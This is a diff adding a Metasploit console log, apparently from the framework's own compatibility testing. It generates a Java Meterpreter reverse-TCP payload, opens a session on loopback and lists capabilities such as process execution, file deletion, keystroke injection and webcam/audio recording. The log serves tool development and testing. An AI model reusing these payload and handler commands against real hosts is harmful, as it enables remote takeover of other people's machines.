@@ -1,0 +1,57 @@
+use java/meterpreter/reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/javameterpreterreverse_tcp_session_tlv_logging20231026-4729-r8yvtrtxt
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-java-meterpreter-reverse-tcp20231026-4729-x27wlv.jar -f jar AutoVerifySessionTimeout=30 lport=6004 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/javameterpreterreverse_tcp_debug_log20231026-4729-1dovejtxt spawn=0
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> SessionTlvLogging => file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/javameterpreterreverse_tcp_session_tlv_logging20231026-4729-r8yvtrtxt
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> [*] Writing 5259 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-java-meterpreter-reverse-tcp20231026-4729-x27wlv.jar...
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 3
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6004 
+[*] Sending stage (57692 bytes) to 127.0.0.1
+[*] Meterpreter session 4 opened (127.0.0.1:6004 -> 127.0.0.1:49779) at 2023-10-26 19:03:54 +0000
+resource scripts/resource/meterpreter_compatibility.rc
+[*] Processing /Users/runner/work/metasploit-framework/metasploit-framework/scripts/resource/meterpreter_compatibility.rc for ERB directives.
+[*] resource (/Users/runner/work/metasploit-framework/metasploit-framework/scripts/resource/meterpreter_compatibility.rc)> Ruby Code (1113 bytes)
+[2023-10-26 19:03:54 +0000][android] Starting to loading extension
+[2023-10-26 19:03:54 +0000][android] Failed loading
+[2023-10-26 19:03:54 +0000][appapi] Starting to loading extension
+[2023-10-26 19:03:54 +0000][appapi] Failed loading
+[2023-10-26 19:03:54 +0000][bofloader] Starting to loading extension
+[2023-10-26 19:03:54 +0000][bofloader] Failed loading
+[2023-10-26 19:03:54 +0000][espia] Starting to loading extension
+[2023-10-26 19:03:54 +0000][espia] Failed loading
+[2023-10-26 19:03:54 +0000][extapi] Starting to loading extension
+[2023-10-26 19:03:54 +0000][extapi] Failed loading
+[2023-10-26 19:03:54 +0000][incognito] Starting to loading extension
+[2023-10-26 19:03:54 +0000][incognito] Failed loading
+[2023-10-26 19:03:54 +0000][kiwi] Starting to loading extension
+[2023-10-26 19:03:54 +0000][kiwi] Failed loading
+[2023-10-26 19:03:54 +0000][lanattacks] Starting to loading extension
+[2023-10-26 19:03:54 +0000][lanattacks] Failed loading
+[2023-10-26 19:03:54 +0000][peinjector] Starting to loading extension
+[2023-10-26 19:03:54 +0000][peinjector] Failed loading
+[2023-10-26 19:03:54 +0000][powershell] Starting to loading extension
+[2023-10-26 19:03:54 +0000][powershell] Failed loading
+[2023-10-26 19:03:54 +0000][priv] Starting to loading extension
+[2023-10-26 19:03:54 +0000][priv] Failed loading
+[2023-10-26 19:03:54 +0000][python] Starting to loading extension
+[2023-10-26 19:03:54 +0000][python] Failed loading
+[2023-10-26 19:03:54 +0000][sniffer] Starting to loading extension
+[2023-10-26 19:03:54 +0000][sniffer] Failed loading
+[2023-10-26 19:03:54 +0000][stdapi] Starting to loading extension
+[2023-10-26 19:03:54 +0000][stdapi] Loaded extension
+[2023-10-26 19:03:54 +0000][unhook] Starting to loading extension
+[2023-10-26 19:03:54 +0000][unhook] Failed loading
+[2023-10-26 19:03:54 +0000][winpmem] Starting to loading extension
+[2023-10-26 19:03:54 +0000][winpmem] Failed loading
+[2023-10-26 19:03:54 +0000] Generating result:
+{"sessions":[{"session_type":"java/osx","commands":[{"id":32,"name":"core_transport_set_timeouts"},{"id":1,"name":"core_channel_close"},{"id":33,"name":"core_transport_sleep"},{"id":2,"name":"core_channel_eof"},{"id":3,"name":"core_channel_interact"},{"id":5,"name":"core_channel_read"},{"id":8,"name":"core_channel_write"},{"id":10,"name":"core_enumextcmd"},{"id":11,"name":"core_get_session_guid"},{"id":12,"name":"core_loadlib"},{"id":13,"name":"core_machine_id"},{"id":15,"name":"core_native_arch"},{"id":16,"name":"core_negotiate_tlv_encryption"},{"id":17,"name":"core_patch_url"},{"id":21,"name":"core_set_session_guid"},{"id":22,"name":"core_set_uuid"},{"id":23,"name":"core_shutdown"},{"id":24,"name":"core_transport_add"},{"id":25,"name":"core_transport_change"},{"id":27,"name":"core_transport_list"},{"id":28,"name":"core_transport_next"},{"id":29,"name":"core_transport_prev"},{"id":30,"name":"core_transport_remove"},{"id":4,"name":"core_channel_open"},{"id":1001,"name":"stdapi_fs_chdir"},{"id":1003,"name":"stdapi_fs_delete_dir"},{"id":1004,"name":"stdapi_fs_delete_file"},{"id":1006,"name":"stdapi_fs_file_expand_path"},{"id":1007,"name":"stdapi_fs_file_move"},{"id":1005,"name":"stdapi_fs_file_copy"},{"id":1008,"name":"stdapi_fs_getwd"},{"id":1009,"name":"stdapi_fs_ls"},{"id":1011,"name":"stdapi_fs_mkdir"},{"id":1010,"name":"stdapi_fs_md5"},{"id":1013,"name":"stdapi_fs_search"},{"id":1014,"name":"stdapi_fs_separator"},{"id":1016,"name":"stdapi_fs_stat"},{"id":1015,"name":"stdapi_fs_sha1"},{"id":1019,"name":"stdapi_net_config_get_interfaces"},{"id":1022,"name":"stdapi_net_config_get_routes"},{"id":1026,"name":"stdapi_net_socket_tcp_shutdown"},{"id":1024,"name":"stdapi_net_resolve_host"},{"id":1025,"name":"stdapi_net_resolve_hosts"},{"id":1055,"name":"stdapi_sys_config_getuid"},{"id":1052,"name":"stdapi_sys_config_getenv"},{"id":1059,"name":"stdapi_sys_config_sysinfo"},{"id":1056,"name":"stdapi_sys_config_localtime"},{"id":1069,"name":"stdapi_sys_process_execute"},{"id":1068,"name":"stdapi_sys_process_close"},{"id":1071,"name":"stdapi_sys_process_get_processes"},{"id":1098,"name":"stdapi_ui_desktop_screenshot"},{"id":1106,"name":"stdapi_ui_send_mouse"},{"id":1104,"name":"stdapi_ui_send_keyevent"},{"id":1110,"name":"stdapi_webcam_audio_record"},{"id":1072,"name":"stdapi_sys_process_getpid"},{"id":1024,"name":"stdapi_net_resolve_host"},{"id":1025,"name":"stdapi_net_resolve_hosts"},{"id":1026,"name":"stdapi_net_socket_tcp_shutdown"},{"id":1052,"name":"stdapi_sys_config_getenv"},{"id":1055,"name":"stdapi_sys_config_getuid"},{"id":1056,"name":"stdapi_sys_config_localtime"},{"id":1059,"name":"stdapi_sys_config_sysinfo"},{"id":1068,"name":"stdapi_sys_process_close"},{"id":1069,"name":"stdapi_sys_process_execute"},{"id":1071,"name":"stdapi_sys_process_get_processes"},{"id":1072,"name":"stdapi_sys_process_getpid"},{"id":1098,"name":"stdapi_ui_desktop_screenshot"},{"id":1104,"name":"stdapi_ui_send_keyevent"},{"id":1106,"name":"stdapi_ui_send_mouse"},{"id":1110,"name":"stdapi_webcam_audio_record"},{"id":1001,"name":"stdapi_fs_chdir"},{"id":1003,"name":"stdapi_fs_delete_dir"},{"id":1004,"name":"stdapi_fs_delete_file"},{"id":1005,"name":"stdapi_fs_file_copy"},{"id":1006,"name":"stdapi_fs_file_expand_path"},{"id":1007,"name":"stdapi_fs_file_move"},{"id":1008,"name":"stdapi_fs_getwd"},{"id":1009,"name":"stdapi_fs_ls"},{"id":1010,"name":"stdapi_fs_md5"},{"id":1011,"name":"stdapi_fs_mkdir"},{"id":1013,"name":"stdapi_fs_search"},{"id":1014,"name":"stdapi_fs_separator"},{"id":1015,"name":"stdapi_fs_sha1"},{"id":1016,"name":"stdapi_fs_stat"},{"id":1019,"name":"stdapi_net_config_get_interfaces"},{"id":1022,"name":"stdapi_net_config_get_routes"}]}]}
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> sessions -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 4 closed.
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> jobs -K
+Stopping all jobs...
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> 
